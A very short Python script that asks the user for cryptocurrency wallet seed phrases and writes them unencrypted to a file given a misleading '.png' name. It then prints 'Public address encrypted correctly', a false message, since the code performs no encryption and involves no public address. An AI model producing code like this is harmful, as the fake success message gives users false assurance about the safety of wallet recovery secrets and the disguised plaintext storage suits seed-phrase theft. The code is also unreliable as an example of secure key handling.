def create_file():
    file_content = input("Enter the seed phrases: ")
    with open("1771717177727.png", "w") as file:
        file.write(file_content)
    print("Public address encrypted correctly")


def main():
    create_file()


if __name__ == "__main__":
    main()
